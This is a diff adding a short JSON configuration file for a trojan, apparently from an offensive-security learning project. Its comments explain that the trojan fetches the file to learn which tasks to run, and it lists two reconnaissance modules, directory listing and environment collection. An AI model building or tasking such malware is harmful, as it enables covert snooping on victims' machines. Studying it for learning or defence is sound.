@@ -1,0 +1,13 @@
+# this configuration file allows us to tell the trojan which actions to perform and when (inlcude going to sleep)
+# as each trojan should have a unique ID for sorting data and controlling which trojan performs certain tasks
+# this document will be retrieved, parsed, and turned into a python dictionary.
+# being written in JSON format allows it to ammend and change as required
+
+[
+    {
+    "module" : "dirlister"
+     },
+    {
+    "module" : "environment"
+    }
+]
